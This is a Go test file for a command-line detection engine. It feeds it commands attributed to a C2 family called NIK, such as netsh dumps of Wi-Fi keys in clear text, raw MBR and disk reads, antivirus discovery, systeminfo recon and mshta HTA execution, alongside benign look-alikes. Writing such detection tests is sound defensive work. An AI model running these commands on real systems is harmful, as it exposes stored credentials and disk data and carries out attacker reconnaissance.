package collector

import "testing"

// TestNIKC2CommandLines runs the commands Cisco Talos documented NIK C2
// running (October 2026), and look-alikes administrators run every day.
func TestNIKC2CommandLines(t *testing.T) {
	fire := []struct {
		name, image, cmd string
		rules            map[string]Severity
	}{
		{"wifi keys", "cmd.exe", `cmd.exe /c chcp 65001 >nul & netsh wlan show profile name="HomeNet" key=clear`,
			map[string]Severity{"cred.wifi_keys": SevSuspect, "exec.c2_shell_recon": SevNotable}},
		{"wifi keys, netsh itself", "netsh.exe", `netsh  wlan show profiles name=Office key=clear`,
			map[string]Severity{"cred.wifi_keys": SevSuspect}},
		{"MBR copy", "powershell.exe", `powershell -NoProfile -Command "$fs=[System.IO.File]::OpenRead('\\.\PhysicalDrive0'); $b=New-Object byte[] 512; [void]$fs.Read($b,0,512); [IO.File]::WriteAllBytes($env:TEMP+'\mbr_backup.bin',$b)"`,
			map[string]Severity{"defense.raw_disk_access": SevSuspect}},
		{"raw disk through GLOBALROOT", "cmd.exe", `cmd /c type \\?\GLOBALROOT\Device\Harddisk0\DR0 > nul`,
			map[string]Severity{"defense.raw_disk_access": SevSuspect}},
		{"antivirus query", "cmd.exe", `cmd /c chcp 65001 >nul && wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName /value`,
			map[string]Severity{"discovery.av_product": SevNotable, "exec.c2_shell_recon": SevNotable}},
		{"antivirus query, PowerShell", "powershell.exe", `powershell -c "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct"`,
			map[string]Severity{"discovery.av_product": SevNotable}},
		{"systeminfo", "cmd.exe", `cmd.exe /c chcp 65001 > nul & systeminfo`,
			map[string]Severity{"exec.c2_shell_recon": SevNotable}},
		{"process list as JSON", "cmd.exe", `cmd /c chcp 65001 >nul & powershell -NoProfile -Command "Get-Process | Select-Object Id, ProcessName | ConvertTo-Json -Compress"`,
			map[string]Severity{"exec.c2_shell_recon": SevNotable}},
		{"boot configuration", "cmd.exe", `cmd /c chcp 65001 >nul & bcdedit /enum`,
			map[string]Severity{"exec.c2_shell_recon": SevNotable}},
		{"lock screen", "mshta.exe", `mshta.exe "C:\Users\bob\AppData\Local\Temp\lock_screen.html"`,
			map[string]Severity{"exec.mshta_local_file": SevSuspect}},
		{"HTA dropper from Downloads", "mshta.exe", `"C:\Windows\System32\mshta.exe" C:\Users\bob\Downloads\invoice.hta`,
			map[string]Severity{"exec.mshta_local_file": SevSuspect}},
	}
	for _, c := range fire {
		got := rulesOf(analyzeCommandLine("process command line", c.image, c.cmd))
		for rule, sev := range c.rules {
			if f, ok := got[rule]; !ok || f.Severity != sev {
				t.Errorf("%s: %s = %+v, want %s (got %v)", c.name, rule, f, sev, keys(got))
			}
		}
	}

	quiet := []struct {
		image, cmd string
		rules      []string
	}{
		{"netsh.exe", `netsh wlan show profiles`, []string{"cred.wifi_keys"}},
		{"netsh.exe", `netsh wlan show interfaces`, []string{"cred.wifi_keys"}},
		{"wsl.exe", `wsl --mount \\.\PHYSICALDRIVE1 --bare`, []string{"defense.raw_disk_access"}},
		{"powershell.exe", `powershell -NoProfile -c Confirm-SecureBootUEFI`, []string{"exec.c2_shell_recon"}},
		{"bcdedit.exe", `bcdedit /enum`, []string{"exec.c2_shell_recon"}},
		{"cmd.exe", `cmd /c chcp 65001`, []string{"exec.c2_shell_recon"}},
		{"cmd.exe", `cmd /c chcp 65001 >nul && python app.py`, []string{"exec.c2_shell_recon"}},
		{"cmd.exe", `cmd /c chcp 1252 & systeminfo`, []string{"exec.c2_shell_recon"}},
		{"mshta.exe", `mshta.exe "C:\Program Files\Vendor\help.hta"`, []string{"exec.mshta_local_file"}},
		{"mshta.exe", `mshta.exe http://198.51.100.2/x.hta`, []string{"exec.mshta_local_file"}},
	}
	for _, q := range quiet {
		got := rulesOf(analyzeCommandLine("process command line", q.image, q.cmd))
		for _, rule := range q.rules {
			if f, ok := got[rule]; ok {
				t.Errorf("false positive on %q: %+v", q.cmd, f)
			}
		}
	}
}
